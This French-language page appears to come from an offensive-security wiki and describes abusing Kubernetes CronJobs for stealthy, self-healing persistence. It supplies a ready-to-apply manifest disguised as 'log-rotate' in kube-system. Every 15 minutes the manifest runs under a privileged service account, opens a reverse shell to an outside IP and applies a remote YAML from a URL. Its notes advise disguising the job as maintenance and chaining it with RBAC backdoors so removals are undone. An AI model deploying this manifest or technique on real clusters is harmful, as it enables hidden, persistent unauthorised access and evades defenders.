---
order: 3
title: "CronJobs : ré-entrée planifiée dans le cluster"
description: "Un CronJob exécute un job sur une planification, ce qu'un attaquant utilise pour une persistance à faible empreinte : au lieu d'un pod backdoor constamment en exécution, un CronJob se matérialise brièvement par intervalles pour émettre un beacon, replanter un accès ou recréer un binding supprimé. Entre les exécutions, il n'y a aucun pod à trouver, ce qui le rend plus discret qu'une charge de travail permanente."
keywords:
  - cronjob
  - job planifié
  - persistance
  - beacon
  - kubernetes
---

# CronJobs

Un CronJob crée un Job, et donc un pod, sur une planification. Pour la persistance, cela échange la présence constante d'une charge de travail backdoor contre une exécution périodique de courte durée : le pod n'existe que pendant l'exécution du job, puis disparaît, donc entre les exécutions il n'y a rien de permanent qu'un défenseur puisse remarquer. Un attaquant planifie un CronJob qui, à chaque déclenchement, émet un beacon vers un canal de commande, relit des identifiants ou recrée une persistance qui a été supprimée, ce qui en fait un mécanisme auto-réparateur et à faible empreinte.

Nécessite les droits de création sur les cronjobs :

```bash
kubectl auth can-i create cronjobs -n <ns>
```

## Beacon planifié et auto-réparation

```bash
cat <<YAML | kubectl apply -f -
apiVersion: batch/v1
kind: CronJob
metadata: { name: log-rotate, namespace: kube-system }   # innocuous name
spec:
  schedule: "*/15 * * * *"                                 # every 15 minutes
  jobTemplate:
    spec:
      template:
        spec:
          serviceAccountName: <privileged-sa>              # act with a strong identity
          restartPolicy: Never
          containers:
          - name: c
            image: alpine
            command: ["/bin/sh","-c",
              "sh -i >& /dev/tcp/10.0.0.5/4444 0>&1 || true;
               kubectl apply -f https://a/persist.yaml"]
YAML
```

Exécuter le job sous un compte de service privilégié permet à chaque déclenchement de recréer une backdoor RBAC ou une charge de travail supprimée, si bien que retirer un mécanisme de persistance est défait au tick suivant.

## Notes d'exploitation

- L'intérêt est l'intermittence : aucun pod à longue durée de vie à repérer, et les logs ne montrent qu'une activité périodique brève qui ressemble à une tâche de maintenance ; nommez-le et planifiez-le pour correspondre à une opération d'entretien plausible.
- Liez-le à un compte de service puissant pour que chaque exécution puisse réparer d'autres persistances ; cela fait du CronJob la racine d'un ensemble auto-réparateur plutôt qu'un beacon isolé.
- Une courte fenêtre de beacon par exécution suffit à un reverse shell pour appeler l'extérieur ; combinez avec [Backdoor RBAC](rbac-backdoor.md) et [Charges de travail malveillantes](malicious-workloads.md) pour que les mécanismes se restaurent mutuellement.

## Références

- [Kubernetes: CronJob](https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/)
- [Microsoft: Kubernetes threat matrix](https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
